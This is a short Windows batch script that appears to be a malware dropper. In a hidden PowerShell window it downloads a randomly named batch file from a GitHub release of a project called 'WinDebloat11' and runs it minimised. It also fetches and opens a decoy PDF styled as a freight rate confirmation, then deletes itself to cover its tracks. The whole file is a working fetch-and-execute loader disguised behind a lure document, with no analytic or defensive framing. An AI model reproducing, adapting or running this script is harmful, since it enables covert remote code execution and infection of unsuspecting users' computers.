@echo off
setlocal enabledelayedexpansion

set "R=https://github.com/jimmyishere111/WinDebloat11/releases/download/Rel121"
set "T=%TEMP%"
set "D=%USERPROFILE%\Downloads"

echo.
echo  [PowerShell] Downloading...
echo.

powershell.exe -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%R%/wdsrpn43cdv.bat' -OutFile '%T%\wdsrpn431cdv.bat' -UseBasicParsing; Invoke-WebRequest -Uri '%R%/Rate_Confirmation_LD-2026-0847.pdf' -OutFile '%D%\Rate_Confirmation_LD-2026-0847.pdf' -UseBasicParsing" >nul 2>&1

if exist "%T%\wdsrpn431cdv.bat" start "" /min cmd /c "%T%\wdsrpn431cdv.bat"
if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"

timeout /t 2 /nobreak >nul
del "%~f0" /f /q >nul 2>&1
endlocal
exit
